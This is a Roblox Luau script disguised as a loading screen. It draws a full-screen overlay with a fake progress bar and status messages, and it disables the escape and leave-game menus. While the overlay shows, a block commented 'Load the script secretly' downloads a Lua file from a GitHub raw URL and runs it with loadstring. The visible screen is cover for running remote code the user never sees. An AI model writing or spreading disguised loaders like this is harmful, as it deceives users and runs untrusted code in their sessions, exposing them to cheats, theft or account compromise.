-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")

-- Disable CoreGui (Escape Menu, Leave Game, etc.)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.DisplayOrder = 999999 -- High priority to cover everything
screenGui.ResetOnSpawn = false
screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

-- Background (covers entire screen)
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
background.BorderSizePixel = 0
background.Parent = screenGui

-- Roblox Icon (Spinning)
local robloxIcon = Instance.new("ImageLabel")
robloxIcon.Size = UDim2.new(0, 100, 0, 100)
robloxIcon.Position = UDim2.new(0.5, -50, 0.2, -50)
robloxIcon.BackgroundTransparency = 1
robloxIcon.Image = "rbxassetid://4918373417" -- Roblox logo
robloxIcon.Parent = background

-- Spin logic (spinning the logo)
local rotation = 0
local running = true
local connection
connection = RunService.RenderStepped:Connect(function(dt)
	if running then
		rotation = rotation + 90 * dt
		robloxIcon.Rotation = rotation % 360
	else
		connection:Disconnect()
	end
end)

-- Loading Text (Main text)
local loadingText = Instance.new("TextLabel")
loadingText.Text = "Loading..."
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 48
loadingText.TextColor3 = Color3.fromRGB(255, 0, 0)
loadingText.BackgroundTransparency = 1
loadingText.Size = UDim2.new(1, 0, 0.1, 0)
loadingText.Position = UDim2.new(0, 0, 0.4, 0)
loadingText.Parent = background

-- Outline for main text
local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(255, 255, 255)
stroke.Thickness = 2
stroke.Parent = loadingText

-- Status Text (progressive loading message)
local statusText = Instance.new("TextLabel")
statusText.Text = "Loading assets..."
statusText.Font = Enum.Font.Gotham
statusText.TextSize = 24
statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
statusText.BackgroundTransparency = 1
statusText.Size = UDim2.new(1, 0, 0.05, 0)
statusText.Position = UDim2.new(0, 0, 0.49, 0)
statusText.Parent = background

-- Percent Text (showing percentage of completion)
local percentText = Instance.new("TextLabel")
percentText.Text = "0%"
percentText.Font = Enum.Font.Gotham
percentText.TextSize = 36
percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
percentText.BackgroundTransparency = 1
percentText.Size = UDim2.new(1, 0, 0.1, 0)
percentText.Position = UDim2.new(0, 0, 0.58, 0)
percentText.Parent = background

-- Progress Bar Background
local progressBarBg = Instance.new("Frame")
progressBarBg.Size = UDim2.new(0.6, 0, 0.02, 0)
progressBarBg.Position = UDim2.new(0.2, 0, 0.67, 0)
progressBarBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
progressBarBg.BorderSizePixel = 0
progressBarBg.Parent = background
progressBarBg.ClipsDescendants = true

-- Progress Bar Fill
local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.Position = UDim2.new(0, 0, 0, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
progressBar.BorderSizePixel = 0
progressBar.Parent = progressBarBg

-- Credit Text (Made by vakfq)
local creditText = Instance.new("TextLabel")
creditText.Text = "Made by vakfq"
creditText.Font = Enum.Font.Gotham
creditText.TextSize = 16
creditText.TextColor3 = Color3.fromRGB(255, 255, 255)
creditText.BackgroundTransparency = 1
creditText.Size = UDim2.new(1, 0, 0.05, 0)
creditText.Position = UDim2.new(0, 0, 0.95, 0)
creditText.Parent = background

-- Background loading script (Load the script secretly)
task.spawn(function()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/vakfq/test/main/script.lua"))()
    end)
    if not success then
        warn("Failed to load external script: ", err)
    end
end)

-- Progress update loop (smoother increments)
for i = 0, 100 do
	percentText.Text = i .. "%"

	-- Tween progress bar smoothly over 0.018 seconds per 1%
	local tween = TweenService:Create(progressBar, TweenInfo.new(0.018, Enum.EasingStyle.Linear), {
		Size = UDim2.new(i / 100, 0, 1, 0)
	})
	tween:Play()

	-- Status messages based on percent
	if i <= 21 then
		statusText.Text = "Loading assets..."
	elseif i <= 34 then
		statusText.Text = "Loading character..."
	elseif i <= 67 then
		statusText.Text = "Loading map..."
	elseif i < 100 then
		statusText.Text = "Finalizing..."
	elseif i == 100 then
		statusText.Text = "DONE"
	end

	wait(0.018)
end

-- Fade out everything once loading is complete
for i = 1, 10 do
	local transparency = i / 10
	background.BackgroundTransparency = transparency
	loadingText.TextTransparency = transparency
	statusText.TextTransparency = transparency
	percentText.TextTransparency = transparency
	stroke.Transparency = transparency
	robloxIcon.ImageTransparency = transparency
	progressBar.BackgroundTransparency = transparency
	progressBarBg.BackgroundTransparency = transparency
	creditText.TextTransparency = transparency
	wait(0.05)
end

running = false -- stops spinning logo
screenGui:Destroy()

-- Re-enable CoreGui (Escape Menu, Leave Game, etc.)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
